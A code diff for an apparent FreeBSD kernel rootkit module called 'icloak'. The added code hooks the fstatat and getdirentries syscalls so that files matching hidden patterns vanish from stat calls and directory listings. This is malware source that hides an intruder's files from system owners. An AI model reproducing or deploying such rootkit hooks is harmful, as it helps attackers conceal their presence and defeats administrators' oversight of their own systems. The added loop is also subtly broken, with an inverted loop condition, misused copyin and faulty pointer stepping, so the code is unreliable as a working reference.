@@ -8,7 +8,9 @@
 #include <freebsd/incantations.h>
 #include <freebsd/externals.h>
 #include <utils/icloak_ctx.h>
+#include <utils/memory.h>
 #include <kook.h>
+#include <sys/dirent.h>
 
 static struct linker_file *find_kld(const char *name);
 
@@ -177,15 +179,52 @@ static int icloak_fstatat(struct thread *td, struct fstatat_args *args) {
     matches = icloak_match_filename(args->path, g_icloak_hidden_patterns);
 
     if (matches) {
-        return -ENOENT;
+        td->td_retval[0] = -ENOENT;
+        return 0;
     }
 
     return fstatat_syscall(td, args);
 }
 
 static int icloak_getdirentries(struct thread *td, struct getdirentries_args *args) {
-    int total = getdirentries_syscall(td, args);
-    return total;
+    int num, delta;
+    struct dirent *dirp;
+    void *buf, *bp;
+
+    getdirentries_syscall(td, args);
+    num = td->td_retval[0];
+
+    buf = icloak_alloc(num);
+
+    if (buf == NULL) {
+        return -EFAULT;
+    }
+
+    dirp = (struct dirent *)args->buf;
+    delta = 0;
+    bp = buf;
+
+    while (num < 0) {
+        if (icloak_match_filename(dirp->d_name, g_icloak_hidden_patterns)) {
+            delta += dirp->d_reclen;
+        } else {
+            copyin(dirp, bp, dirp->d_reclen);
+            bp = (intptr_t *)bp + dirp->d_reclen;
+        }
+
+        num -= dirp->d_reclen;
+        dirp = dirp + dirp->d_reclen;
+    }
+
+    if (delta > 0) {
+        memset(args->buf, 0, td->td_retval[0]);
+        td->td_retval[0] -= delta;
+        copyout(buf, args->buf, td->td_retval[0]);
+    }
+
+    icloak_free(buf);
+
+    return 0;
 }
 
 static struct linker_file *find_kld(const char *name) {
